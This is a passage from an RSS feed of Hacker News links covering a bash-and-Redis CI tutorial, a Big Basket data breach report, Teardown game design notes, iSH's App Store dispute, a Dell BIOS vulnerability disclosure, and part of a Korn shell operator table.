	id=$(uuid)
	echo "Starting CI job $id"
	redis-cli hset "$id" rev "$newrev" &gt;/dev/null
	redis-cli hset "$id" ref "$ref" &gt;/dev/null
	redis-cli lpush jobs "$id" &gt;/dev/null
done
</code></pre>
<h2>Defining build jobs</h2>
<p>By convention our system will run whatever is in an executable script named <code>ci.sh</code>. The drawback is that this only works with trusted systems and access to the repository needs to be guarded to prevent random code execution. The big advantage is that we don't need to come up with a job definition DSL or cumbersome file format.</p>
<p>Our convention will also be that the script will be passed one argument: the name of the git ref, so we can decide what to do based on the branch we are on.</p>
<p>Let's just put this into a file named <code>ci.sh</code>:</p>
<pre><code>#!/usr/bin/env bash

# the git ref gets passed in as the only argument
ref="$1"

# pretend we're running tests
echo "running tests"

# only deploy if we're on the main branch
[[ "$ref" == "refs/heads/main" ]] &amp;&amp; echo "Deploying"
</code></pre>
<h2>The build runner</h2>
<p>Now that jobs are queued the last piece missing is a job runner. We will make use of Redis' <a href="https://redis.io/commands/blpop">BLPOP command</a> to block until the jobs list has a new job for us. That job id will give us the revision we need to check out and will allow us to write back the output and status of the job.</p>
<p>Note that, as discussed, this assumes a repository called <code>test</code> is already checked out right next to the script.</p>
<p>tiny-ci.sh</p>
<pre><code>#!/usr/bin/env bash

# ./runner.sh is supposed to run on the server where your git repository lives

# the logic in here will run in an infinite loop:
# * (block and) wait for a job
# * run it
while :
do

# Announce that we're waiting
echo "Job runner waiting"

# We are using https://redis.io/commands/blpop to block until we have a new
# message on the "jobs" list. We use `tail` to get the last line because the
# output of BLPOP is of the form "list-that-got-an-element\nelement"
jobid=$(redis-cli blpop jobs 0 | tail -n 1)

# The message we received will have the job uuid
echo "Running job $jobid"

# Get the git revision we're supposed to check out
rev=$(redis-cli hget "${jobid}" "rev")
echo Checking out revision "$rev"

# Get the git ref
ref=$(redis-cli hget "${jobid}" "ref")

# Prepare the repository (hardcoded path) by getting that commit
cd test || exit; git fetch &amp;&amp; git reset --hard "$rev";

# Actually runs the job and saves the output
if ! output=$(./ci.sh "$ref" 2&gt;&amp;1);
then
    status="failed";
else
    status="success";
fi;

# Update the result status
redis-cli hset "${jobid}" "status" $status;

# Update the job output
redis-cli hset "${jobid}" "output" "$output";

echo "Job ${jobid} done"

done
</code></pre>
<h2>Running it</h2>
<p>Summing up:</p>
<ul>
<li>there's a bare git repository somewhere, called <code>test.git</code></li>
<li>we can clone the empty repo (or create a new one and add the respective remote)</li>
<li>on the server hosting the git repository we clone <code>test.git</code> into <code>test</code> and place <code>tiny-ci.sh</code> next to it</li>
<li>we run builds by starting <code>tiny-ci.sh</code> on the server hosting the repository</li>
</ul>
<p>Now if we <code>git push</code> a new commit to the <code>main</code> branch with the <code>ci.sh</code> file from above, the output will return the job id</p>
<pre><code>Enumerating objects: 5, done.
...
remote: Starting CI job dab82634-21cc-11eb-b3b3-9b8767dff47c
</code></pre>
<h2>Checking build status</h2>
<p>Knowing a job uuid, the easiest way to get the status
of a build is by using the <code>--csv</code> style output of the <a href="https://redis.io/commands/hgetall">HGETALL</a> command of redis.</p>
<pre><code>$ ssh example.com redis-cli --csv hgetall $JOB_UUID
"rev","f0706ea18a22031f84619b1161c8fbdb0dcd6850","ref","refs/heads/master","status","success","output","running tests\nDeploying"
</code></pre>
<h2>Possible further improvements</h2>
<ul>
<li>
<p><strong>multi-repo support</strong></p>
<p>This would mean changes to the <code>post-receive</code> hook to put jobs in a list named <code>job-${REPONAME}</code> and then have the worker also react based on that. Notice how <code>redis-cli blpop</code> takes several lists to watch and will also return the name of the list.</p>
</li>
<li>
<p><strong>job cleanup</strong></p>
<p>Creating a key for every job pollutes the redis database unnecesarily. Enqueuing the job could be done via <a href="https://redis.io/commands/setex">SETEX</a> so that the keys go away after one hour / one day / one week. The purpose of Redis here is short term storage and not long-term archival of job results</p>
</li>
<li>
<p><strong>more workers</strong></p>
<p>Scaling to multiple workers on the same machine would need different working folders (and some process isolation depending on the tasks run in there). Scaling to multiple machines would need access to a central redis instance for job distribution.</p>
</li>
<li>
<p><strong>worker isolation / sandboxing</strong></p>
<p>For more complex tasks some kind of process and file-system isolation is necessary. The worker could spin up VMs or Docker containers. The build system used on <a href="https://builds.sr.ht/">builds.sr.ht</a> for instance uses a <a href="https://man.sr.ht/builds.sr.ht/installation.md#security-model">Docker container run as an unprivileged user in a KVM qemu machine</a>.</p>
</li>
<li>
<p><strong>timestamps</strong></p>
<p>For convenience you would definitely want timestamps for every operation. This also allows to list queries like "the last five jobs" or to do maintenance on job results based on their time.</p>
</li>
<li>
<p><strong>notifications</strong></p>
<p>Any CI system will have some form of notifications and the simplest form would be to do something in the script, right at the end. But this covers only the success case, so a better approach would be to create a notification queue and have a notification worker react on that.</p>
</li>
</ul>
<p><a href="https://lobste.rs/s/fbc6wl/tiny_ci_system">Discuss on lobste.rs</a></p>


<ul>
  
</ul>

    </div></div>]]>
            </description>
            <link>https://www.0chris.com/tiny-ci-system.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028450</guid>
            <pubDate>Sun, 08 Nov 2020 19:59:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data of 20 Million Big Basket Users Up for Sale on Dark Net]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25028437">thread link</a>) | @notRobot
<br/>
November 8, 2020 | https://cyspyindia.com/article/data-of-two-crore-big-basket-users-up-for-sale-on-dark-net/ | <a href="https://web.archive.org/web/*/https://cyspyindia.com/article/data-of-two-crore-big-basket-users-up-for-sale-on-dark-net/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h3>
                    Data Of Two Crore Big Basket Users Up For Sale On Dark Net
                </h3>


                

                

                

                

                
                <p>
                    <img src="https://cyspyindia.com/media/resources/155218ae437051499cb91d03046e64df.jpg">
                    <small>
                        A sample of the leaked data. Picture Courtesy: Cyble
                    </small>
                </p>
                
                <p>Indian food and grocery chain Big Basket was reported to have fallen prey to a data breach, with details of two crore of its customers reportedly being put up for sale on the dark web.&nbsp;</p><p>The retail giant known for online sale and delivery of groceries was founded in 2011 and offers its services across the country. Online grocery shopping became all the more popular in India ever since the country was placed under lockdown in light of the COVID 19 pandemic.&nbsp;</p><p>According to researchers at Cyble, the data breach was discovered during a routine sweep of the dark web on Friday. Cyble, in an official update on their website, stated that the data was being offered for sale for USD 40,000. Based on the data examined so far, Cyble believes that it was hacked from Big Basket servers in mid-October this year.&nbsp;</p><p>“The leak contains a database portion, with the table name ‘member_member’. The size of the SQL file is 15 GB, containing close to 20 Million user data. More specifically, this includes names, email IDs, password hashes, contact numbers (mobile + phone), addresses, date of birth, location, and IP addresses of login, among many others,” Cyble update said.&nbsp;</p><p>Cyble founder Beenu Arora told CySpy India that inquiries were still underway regarding the threat actor who was offering the data for sale, and that all the details regarding the incident had been shared with Big Basket.&nbsp;</p><p>CySpy India has reached out to Big Basket for comment and their response will be added to this article as soon as it is received.</p><p>Cyble has acquired the data and published it on its indexing website - AmiBreached - where users who suspect that their details might be part of the leaked data can check for the same.&nbsp;</p>
            </div></div>]]>
            </description>
            <link>https://cyspyindia.com/article/data-of-two-crore-big-basket-users-up-for-sale-on-dark-net/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028437</guid>
            <pubDate>Sun, 08 Nov 2020 19:57:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teardown Design Notes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25028432">thread link</a>) | @agluszak
<br/>
November 8, 2020 | http://blog.tuxedolabs.com/2020/11/05/teardown-design-notes.html | <a href="https://web.archive.org/web/*/http://blog.tuxedolabs.com/2020/11/05/teardown-design-notes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Teardown started as a technology experiment and it’s one of those games where gameplay was designed to fit the technology, rather than the other way around. It’s not the first time I’ve been involved in such projects (Sprinkle, Smash Hit), and probably not the last, but Teardown was by far the most frustrating experience yet.</p>

<p>The idea of a fully destructible environment is compelling for the player but a nightmare for the game designer. Walls can no longer be used as obstacles, key objects that the player might need to complete an objective can break and the designer is no longer in control over a players path through the game, potentially breaking the intended progression. Not to mention all the technical hurdles a fully destructible environment implies when it comes to physics, lighting, scripting, etc, but more on that is a future blog post.</p>

<p>Destruction is often used in games as a decorative special effect, but for Teardown the intention was always to use destruction as the key element in gameplay and with a limited amount of action, allowing the player to do detailed precision work rather than total mayhem.</p>

<p><a href="http://blog.tuxedolabs.com/assets/2020-11-05-teardown.png"><img src="http://blog.tuxedolabs.com/assets/2020-11-05-teardown.png" alt=""></a></p>

<p>After nearly a full year of experimentation and many failed prototypes, the idea of a two-phase heist setting was born. It’s compatible with all the limitations (or lack thereof) that a fully destructible environment impose, while still offering an interesting challenge. It allows the player to move around freely in a fully accessible environment, carefully planning the heist and creating shortcuts using destruction, vehicles and objects from the environment in a creative way. The player chooses when, and I think it’s important that this is the players decision, to go into action mode and try out the created path.</p>


<p>Allowing the player to destroy everything has a huge impact on level design. Since any wall can be torn down, the only true obstacles at our disposal are elevation, distance, water and unbreakable objects. We could use unbreakable objects more, but it would make the environment harder to read and imply a failure to deliver on the promise of a fully destructible environment. Therefore unbreakable objects are only used for rock formations and the ground you’re standing on.</p>

<p>The relatively small level size started as a technical limitation, but I don’t think the game would benefit from larger levels even if it was technically possible. Villa Gordon is currently the largest level in the game, and it can already be a bit tedious to walk around during the preparation phase. Personally I think the game shines in a more compact and cluttered environment like Hollowrock Island, with some verticality to allow for more interesting shortcuts.</p>

<p>The only place we found the level size to be a limitation was the end chase on Frustrum level. We originally anticipated it to be twice as long, but due to a 3D texture size limitation on AMD graphics cards, we had to restrict it to 400 meters. We could have made it twice as long using a U-shaped level, but we also wanted to keep the level straight to have the goal direction consistently aligned with the sun.</p>


<p>Nobody likes a timer, and in previous iterations of the game idea there was no timer. Since the game offers so much player freedom, the only viable option to impose any form of challenge would be resource limitations, and for a sandbox game where destruction plays a central role, adding restrictive resource limitations just doesn’t make the game fun. The goal with the alarm timer has always been to offer a challenge even with a generous amount of tools and resources. While I can agree that a timer is usually a bad idea in game design, I’m really happy the way it turned out in Teardown.</p>

<p>Along the way we’ve mixed up the timed missions with other types where the challenge comes more from moving heavy objects, demolishing buildings or putting out fires, but I’m not convinced that alone could support a whole game. In several missions there are alarmed targets attached to something heavy, allowing it to be moved around to some extent, which I think is a good mix, letting the player choose whether to tinker with the environment or just make a run for it.</p>

<p><a href="http://blog.tuxedolabs.com/assets/2020-11-05-chopper.png"><img src="http://blog.tuxedolabs.com/assets/2020-11-05-chopper.png" alt=""></a></p>

<p>A popular suggestion has been to have the security chopper chase the player after arriving to the scene instead of 	instant failure, but as a general solution I don’t think it’s a good idea. It would introduce an element of randomness that would discourage the strategic thinking and careful planning that this game is all about, in favor of just replaying the mission until reaching the escape vehicle before dying. So instead we added a separate mission type that still allows the player to make preparations, but the chopper shows up shortly after clearing the first target, effectively replacing the timer with an enemy. I think both mission types work well, but that doesn’t necessarily mean it’s a good idea to combine them.</p>


<p>Quicksave can be a sensitive topic in game design. For linear games it’s often a tough decision whether to offer quicksave at any time or save progression only at certain times or locations. Some players refuse to use a generous quicksave feature, as it could be considered cheating.</p>

<p>This is something I think turned out particularly well in Teardown - allowing just one save slot, freely available at any time during preparation, but disabled as soon as the alarm goes off. It encourages player experimentation during the preparation phase, but since there is only one slot, it must still be used wisely. Even with quicksave available, a major change of plans often requires a full restart anyway due to resource limitations, vehicle condition or broken objects.</p>

<p>Trying out a route and then go back to the planning phase for improvement is a key part of the core loop and so intrinsic to the game that we actually enforce it in the third mission to communicate that this is the intended way to play the game.</p>


<p>Since any mission can be played in an infinte number of ways there is already natural incentive for replayability, but there are a couple of things in the game specifically designed to increase replayability. Most missions have optional targets that will increase the score. These optional targets are often placed in strategic locations that break up the most efficient path of the required targets, encouraging the player to use a different strategy and/or starting location.</p>

<p>New tools and upgrades introduced later in the game make all earlier missions easier to complete. It gives a natural incentive to go back and replay missions with better tools, clearing more optional targets, which increases score and gives even better tools, forming an outer game loop that can be quite rewarding. Admittedly, for this to have a strong impact on the game, there would need to be more optional targets. However, introducing a lot of optional targets early in the game can be quite overwhelming, so the whole thing might need to be redisigned a bit to work as intended.</p>


<p>Let’s be honest - no one plays Teardown for the story, but I think it serves an important role to frame the missions and as an incentive for progression. It was an early decision to deliver the story in the form of one way e-mail communication and I’m quite happy the way it turned out. Since the player can go back and read old e-mails, it’s possible to catch up on the story when coming back after taking a break from the game. This is something I miss in a lot of other games - the ability to recap the story when coming back to them.</p>

<p>The reason e-mails cannot be replied to is part of the bigger goal of making the player fully anonymous. The main character in Teardown is intentionally lacking name, age, gender and personality traits to fully leave that up the players imagination.</p>

<p><a href="http://blog.tuxedolabs.com/assets/2020-11-05-mail.png"><img src="http://blog.tuxedolabs.com/assets/2020-11-05-mail.png" alt=""></a></p>

<p>The story is also told through the environments, how they progress, descriptions of objects in them, themed valuables and last but not least the television. There’s a lot of room for improvements here. I originally envisioned much more environmental changes when coming back to the same environment (also involving procedural changes based on the players actions) but for several reasons we had to cut back on that.</p>

<p>Missions are kept separate from the e-mails on the Missions tab to give the player an overview of available missions for a particular location. This is to further incentivice replayability and make it clear where improvements are possible to increase score and rank.</p>


<p>Whether to have sandbox levels directly accessible or tied to campaign progression has been a long internal discussion. Knowing that a lot of people would want to play Teardown just for the sandbox experience, it may seem a bit inconsiderate to enforce a complete playthrough to make everything accessible. On the other hand, keeping all environments and tools available in sandbox mode from the beginning would ruin the experience for campaign players.</p>

<p>The route we chose was to keep them locked, but introduce new environments and tools relatively early in the campaign. The first three environments can be unlocked after completing just five missions while the fourth one requires a bit more work. While not suiting everyone, I think it turned out quite well, and I hope more people play and enjoy the campaign because of this decision.</p>

<p>Tool upgrades also carry over to the sandbox mode, which gives a stronger incentive to scavenge valuables and upgrade tools in the campaign.</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>http://blog.tuxedolabs.com/2020/11/05/teardown-design-notes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028432</guid>
            <pubDate>Sun, 08 Nov 2020 19:57:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About iSH’s pending removal from the App Store]]>
            </title>
            <description>
<![CDATA[
Score 640 | Comments 369 (<a href="https://news.ycombinator.com/item?id=25028252">thread link</a>) | @tbodt
<br/>
November 8, 2020 | https://ish.app/app-store-removal | <a href="https://web.archive.org/web/*/https://ish.app/app-store-removal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        

<p><strong><span>Update</span></strong>: We got a call this evening from someone who runs App Review. They apologized for the experience we had, then told us they've accepted our appeal and won't be removing iSH from the store tomorrow. We'll stay in contact with them to work out details. Thanks everyone for your support!
</p>


<p>On Monday, October 26th, just four days after we launched iSH on the App Store, we received a call from Apple informing us that they had found our app noncompliant with section 2.5.2 of the App Store Review Guidelines and that they would remove the app from sale if we did not submit a satisfactory update within two weeks. Despite our best efforts, we do not believe we will be able to bring iSH into compliance by tomorrow, the conclusion of this 14 day period, and we expect iSH to no longer be available to download from the App Store after that time. We are working our hardest to get iSH back on the App Store as soon as possible and hope for your understanding and support as we navigate our next steps in this process.</p>

<p>Thanks for using iSH!<br>
Theodore Dubois, Saagar Jha &amp; Martin Persson</p>

<h2 id="why-is-ish-being-removed">Why is iSH being removed?</h2>
<p>Apple believes iSH is not compliant with section 2.5.2 of the App Store Review Guidelines, which governs applications which download and run executable code. Specifically, they believe that iSH “is not self-contained and has remote package updating functionality”, and suggest that we should “remove the remote network activity functionality which could allow for remote code importing into the app, such as wget or curl, or other remote network commands”. Additional communication with Apple has indicated that they believe that iSH is a security concern if we allow any sort of code importing by the user.</p>

<p><strong>We believe iSH is fully compliant with the App Store Review Guidelines.</strong> <a href="https://saagarjha.com/blog/2020/11/08/fixing-section-2-5-2/">Saagar has written</a> a more detailed analysis of why we believe this rejection is incorrect, how we believe Apple has misinterpreted and misapplied this rule to our app, and describe how 2.5.2’s poor wording coupled with the review team being unable to review functionality of scripting applications leads to mistaken classifications like these. At a high level, Apple has selectively targeted iSH using section 2.5.2 without fullying understanding our application, their own guidelines, or the consequences of what they are asking and how they affect the App Store ecosystem as a whole. <strong>Consistent enforcement of Apple’s incorrect interpretation would require the removal of all scripting apps, including many of the most popular applications in the App Store and some of Apple’s own applications.</strong></p>

<h2 id="what-have-we-done-to-get-ish-back-on-the-app-store">What have we done to get iSH back on the App Store?</h2>
<p>We’ve been working for the last two weeks to try to keep iSH available without interruptions. We have drafted numerous appeals, requests for clarifications, rule modifications, and explanatory emails. We’ve been on the phone with Apple for hours. Unfortunately, even with this we have been unable to resolve the issue, and the process has been significantly more stressful than we would have liked it to be. Theodore, the primary iSH liaison to Apple, <a href="https://tbodt.com/2020/11/08/app-review-experiences.html">has written about</a> how this process should be improved.</p>

<p>Our first interaction with the App Store review team actually dates back to May, not October: we wanted to know what Apple thought of iSH, since we weren’t sure how the rules would be enforced for it. Of course, iSH complies with the letter of the guidelines, but review found it to violate 2.5.2 because it could download Linux executable code. The problem appeared that apk lets you install packages, so we decided to remove it and work on other features to make the app more useful in its absence. We submitted this updated build in October and this was what is currently on the App Store.</p>

<p>After our build was flagged for noncompliance, we went through the usual review process: we first asked for clarification, and then after we realized that the rule was being misapplied we submitted a rule change request and of course appealed the decision as well. As the deadline approached we sent off an email to Phil Schiller as well detailing our situation. Unfortunately none of this led anywhere, which brings up to our current situation today.</p>

<h2 id="does-this-mean-i-cant-use-ish-anymore">Does this mean I can’t use iSH anymore?</h2>
<p>No, not at all. However, it will mean that you will no longer be able to get iSH from the App Store, which is something which we would still like to be able to provide. The App Store remains the easiest and most popular method of software distribution on iOS, and we’re working hard to save iSH’s listing because we think the app should have a permanent spot there for users who prefer this method of distribution.</p>

<p>Removal of iSH’s listing on the App Store should not affect your use of iSH if you download the app before it is removed. We have not received any compliance messages from Apple regarding <a href="https://testflight.apple.com/join/97i7KM8O">our TestFlight beta</a>, so we plan to continue offering prerelease versions of iSH there for up to 10,000 beta testers.</p>

<p>Precompiled builds of iSH (distributed as IPA files) will <a href="https://github.com/ish-app/ish/releases">remain available on GitHub</a> for <a href="https://ish.app/altstore">installation through AltStore</a> and for jailbroken users. Advanced users are welcome to <a href="https://github.com/ish-app/ish#build-for-ios">build iSH</a> themselves—it’s free and open source and always will be!</p>

<p><strong><span>Update</span>: <a href="https://twitter.com/a_Shell_iOS/status/1325526061099196416">a-Shell has mentioned</a> that they have received a similar rejection notice. Apple may be running extra review for scripting apps.</strong></p>

        <hr>
        <p><a href="https://ish.app/">Return home</a> | 2020-11-08</p>
    

</div>]]>
            </description>
            <link>https://ish.app/app-store-removal</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028252</guid>
            <pubDate>Sun, 08 Nov 2020 19:33:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CVE-2020-5387: Prevent a Dell XPS 9370 from booting]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25028250">thread link</a>) | @Sayrus
<br/>
November 8, 2020 | https://sayr.us/exploit/dell-exploit/ | <a href="https://web.archive.org/web/*/https://sayr.us/exploit/dell-exploit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In August 2019, I’ve discovered a bug in how the XPS Bios handles a bootable
device. This bug allows an attacker with write permission to a bootable device
or physical access to the computer to prevent it from booting.</p>

<h2 id="the-bug">The bug</h2>

<blockquote>
  <p>The vulnerability is available <a href="https://www.dell.com/support/article/en-us/sln322626/dsa-2020-209-dell-xps-13-9370-improper-exception-handling-vulnerability">on Dell’s website</a>
or by its <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5387">CVE Identifier</a>.</p>
</blockquote>

<p>The Dell XPS reads and drops file on the primary disk during the booting and
BIOS upgrade process. Namely, it drops:</p>
<ol>
  <li><code>/boot/EFI/Dell/Bios/Recovery/BIOS_PRE.rcv</code></li>
  <li><code>/boot/EFI/Dell/Bios/Recovery/BIOS_CUR.RCV</code></li>
</ol>

<p>These files are used by a process called BIOS Recovery Tool. On the XPS 9370,
<a href="https://www.dell.com/support/article/en-us/sln300716/how-to-recover-the-bios-on-a-dell-computer-or-tablet">BIOS Recovery 3</a>
is used.</p>

<blockquote>
  <p><code>BIOS_PRE.rcv</code> is used for F2/F12 recovery.
<code>BIOS_CUR.rcv</code> is used only during the process of flash update failures. After the successful FW update <code>BIOS_CUR.rcv</code> is always copied to <code>BIOS_PRE.rcv</code>.</p>
</blockquote>

<p>When <code>BIOS_PRE.rcv</code> is corrupted, the BIOS crashes. Triggering this bug prevents
the laptop from accessing the boot menu and accessing the BIOS. The only way to
recover from the exploit is to unplug the exploited boot device. If the exploit is
done on the internal disk, this means that you need to disassemble the laptop.</p>

<p>When “Bios Recovery from Hard Drive” is disabled, recovery (and the exploit) only works from USB stick / USB hard drive.</p>

<h2 id="a-tale-of-failure">A tale of failure</h2>

<p>This writeup is not your usual exploit writeup. I am not an experienced
attacker, especially not against a blackbox such as my laptop’s BIOS. So how did
I end up finding it?</p>

<p>It all started while I was benchmarking my laptop’s internal drive using <code>fio</code>. I
simply wrote <code>randrw</code> instead of <code>randread</code> and thus overwrote a part of my
own hard drive. This part mostly included my boot partition and the two aforementioned BIOS
files.</p>

<p>Luckily, I already had a live Arch Linux USB key to repair everything. My plan was
simple: reboot, fix, reboot. That doesn’t sound so hard!</p>

<p><img src="https://sayr.us/assets/images/20minutesadventure.jpg" alt="Reboot and fix. Twenty minutes adventure."></p>

<p>After rebooting, I could not access a single BIOS Menu. Everything either froze
on a black screen, or on “Preparing one-time boot menu”. If I was unable to boot
anything or access the BIOS setup, I was not going to be able to fix my problem.</p>

<p>At that time, I didn’t know I found a bug in the BIOS, only that I somehow
fucked up so hard that my laptop was bricked. So I contacted the Dell support,
because I should not be able to brick my laptop like this! They agreed that it
was not supposed to happen and offered me a replacement.</p>

<h3 id="backups-and-a-surprise">Backups and a surprise</h3>

<p>Before sending back my laptop, I wished to recover what I was working on as it
had yet to be pushed. So I took the NVMe out of the laptop and put it in another
machine to dump a disk image. Right after removing the NVMe, I could access the
Bios and even boot on my USB stick.</p>

<p>Was my NVMe broken? From another computer, I could access any file on it. The
boot partition was indeed corrupted but the content of the LUKS partition was
sane.</p>

<p>Well then, if it’s not hardware, is it something on the drive? I dumped a full
disk image on an external HDD, tried to boot it on my laptop and <strong>boom</strong>. I
just reproduced the bug I had earlier on another drive.</p>

<p>I couldn’t miss the chance to play with what I had found so I kept a full disk
image as a backup of my data and another as a way to trigger the bug.</p>

<h3 id="finding-the-culprit">Finding the culprit</h3>

<p>Now that I had a disk image that triggered the bug, it was time to investigate.
At that point, the only information I had were:</p>
<ul>
  <li>I wrote random bytes on my disk, including in the partitions table, the boot
partition, and part of my encrypted disk</li>
  <li>Something on the disk is definitely messing up with the BIOS</li>
  <li>Duplicating the disk image and plugging it in as a USB Disk triggers the bug</li>
</ul>

<p>I assumed that bytes inside my encrypted partition were not the cause as the
BIOS had no reason to read them and they were valid when read from another
computer. Hopefully, it is not broken hardware either.</p>

<h4 id="partitions-table">Partitions table</h4>

<p>My first guess was that my partitions table was invalid and something broke
while enumerating tables. For instance, I might have been listing a partition
offset outside of the disk size, or an invalid size.</p>

<p>To verify that, I created a new partition table from scratch and copied the boot
partition content (files) and tried to boot.</p>

<p>Spoiler alert: <strong>Still broken.</strong></p>

<p>Even better, I did not copy my encrypted partition so the bug was definitely
triggered by something inside the boot partition!</p>

<h4 id="boot-partition">Boot partition</h4>

<p>Obviously, there was something in my boot partition that triggered the bug. But
why would the BIOS read the content of the boot partition? Silly me, I did not
know that BIOS recovery from hard drive was a thing. As far as I knew, it might
have been coming from anything: an invalid folder name, a corrupted file or even
a hard-link to an invalid INode…</p>

<p><em>Obviously not an invalid hard-link as I just did copy the files and there were
no hard-links on this new drive…</em></p>

<p>I was lacking the experience in this kind of bug so the easiest way for me was
to proceed by elimination:</p>
<ul>
  <li><strong>Step 1:</strong> Delete a folder</li>
  <li><strong>Step 2:</strong> Try to boot</li>
  <li>If it boots, restore only this folder, and apply Step 1 to the content of this
folder</li>
  <li>If it does not boot, simply go back to Step 1</li>
  <li><strong>Repeat</strong> until there is only a single file or folder remaining that triggers
the bug</li>
</ul>

<p>I deleted files using this method until I found out that deleting the
<code>/boot/EFI/Dell/Bios/Recovery</code> folder fixed the issue.</p>

<p><strong>Fixed !</strong></p>

<p>At this point, I notified Dell about the bug and sent them the two files that
were triggering the bug. The BIOS being closed source, it would be time
consuming to find:</p>
<ul>
  <li>What the format of <code>BIOS_PRE.rcv</code> and <code>BIOS_CUR.rcv</code> was (looking at
Dell’s documentation, <em>it might just be a Windows executable</em>)</li>
  <li>What field in that file triggers the bug</li>
</ul>

<p>I might have been able to <code>hexdiff</code> a working file with the broken one, to
highlight the differences. However, that would not have given me a better
understanding of the issue. From there, Dell took over and we now have access to
the result of the investigation: <strong>Improper Exception Handling</strong>.</p>

<h2 id="timeline">Timeline</h2>

<ul>
  <li>12 August 2019: Message sent to secure@dell.com without the PoC</li>
  <li>13 August 2019: Answer from Dell asking for more details</li>
  <li>11 September 2019: Message sent to secure@dell.com with steps to reproduce,
including a small disk image and the broken files.</li>
  <li>12 September 2019: Answer from Dell with the ticket number</li>
  <li>26 September 2019: Dell confirmed the problem exists</li>
  <li>January 2020: Dell plans to try to release a patch in April</li>
  <li>April 2020: Dell plans to publish the patch end of May</li>
  <li>May 2020: Dell plans to publish the patch beginning of July</li>
  <li>19 August 2020: Bios 1.13.1 released with the patch</li>
  <li>29 September 2020: Dell notifies me a Security Advisory was published</li>
  <li>16 October 2020: Dell updates the CVE score as the CVE does not require physical access, only high privileges</li>
</ul>

<h2 id="final-words">Final words</h2>

<p>The story might have begun as a scary <em>do your backups</em> story, but it ends without
any data-loss and with a reported vulnerability. Overall, it was a lot of fun and
a fine addition to my collection.</p>

<p>Perhaps next time we’ll talk about how to destroy the displayed image on my
monitor using only a JPEG file or making a video input detected as HDR by
squeezing the DisplayPort cable.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://sayr.us/exploit/dell-exploit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25028250</guid>
            <pubDate>Sun, 08 Nov 2020 19:33:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Korn Shell Operators]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25027977">thread link</a>) | @pazyp
<br/>
November 8, 2020 | http://pazikas.com/2020/11/08/korn-shell-opertators/ | <a href="https://web.archive.org/web/*/http://pazikas.com/2020/11/08/korn-shell-opertators/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I write $SHELL scripts most days, I am always looking these two tables up on other sites rather than commit them to memory,  so why not just post it here so I know where to find it forever more. We mostly use ksh over bash as ksh is on every system regardless of age of that host.</p><div><table><tbody><tr><td><strong>Item</strong></td><td><strong>Description</strong></td></tr><tr><td><strong>-a</strong> <em>File</em></td><td>True, if the specified file is a symbolic link that points to another file that does exist.</td></tr><tr><td><strong>-b</strong> <em>File</em></td><td>True, if the specified file exists and is a block special file.</td></tr><tr><td><strong>-c</strong> <em>File</em></td><td>True, if the specified file exists and is a character special file.</td></tr><tr><td><strong>-d</strong> <em>File</em></td><td>True, if the specified file exists and is a directory.</td></tr><tr><td><strong>-e</strong> <em>File</em></td><td>True, if the specified file exists.</td></tr><tr><td><strong>-f</strong> <em>File</em></td><td>True, if the specified file exists and is an ordinary file.</td></tr><tr><td><strong>-g</strong> <em>File</em></td><td>True, if the specified file exists and its <strong>setgid</strong> bit is set.</td></tr><tr><td><strong>-h</strong> <em>File</em></td><td>True, if the specified file exists and is a symbolic link.</td></tr><tr><td><strong>-k</strong> <em>File</em></td><td>True, if the specified file exists and its sticky bit is set.</td></tr><tr><td><strong>-n</strong> <em>String</em></td><td>True, if the length of the specified string is nonzero.</td></tr><tr><td><strong>-o</strong> <em>Option</em></td><td>True, if the specified option is on.</td></tr><tr><td><strong>-p</strong> <em>File</em></td><td>True, if the specified file exists and is a FIFO special file or a pipe.</td></tr><tr><td><strong>-r</strong> <em>File</em></td><td>True, if the specified file exists and is readable by the current process.</td></tr><tr><td><strong>-s</strong> <em>File</em></td><td>True, if the specified file exists and has a size greater than 0.</td></tr><tr><td><strong>-t</strong> <em>FileDescriptor</em></td><td>True, if specified file descriptor number is open and associated with a terminal device.</td></tr><tr><td><strong>-u</strong> <em>File</em></td><td>True, if the specified file exists and its <strong>setuid</strong> bit is set.</td></tr><tr><td><strong>-w</strong> <em>File</em></td><td>True, if the specified file exists and the write bit is on. However, the file will not be writable on a read-only file system even if this test indicates true.</td></tr><tr><td><strong>-x</strong> <em>File</em></td><td>True, if the specified file exists and the <strong>execute</strong> flag is on. If the specified file exists and is a directory, then the current process has permission to search in the directory.</td></tr><tr><td><strong>-z</strong> <em>String</em></td><td>True, if length of the specified string is 0.</td></tr><tr><td><strong>-L</strong> <em>File</em></td><td>True, if the specified file exists and is a symbolic link.</td></tr><tr><td><strong>-O</strong> <em>File</em></td><td>True, if the specified file exists and is owned by the effective user ID of this process.</td></tr><tr><td><strong>-G</strong> <em>File</em></td><td>True, if the specified file exists and its group matches the effective group ID of this 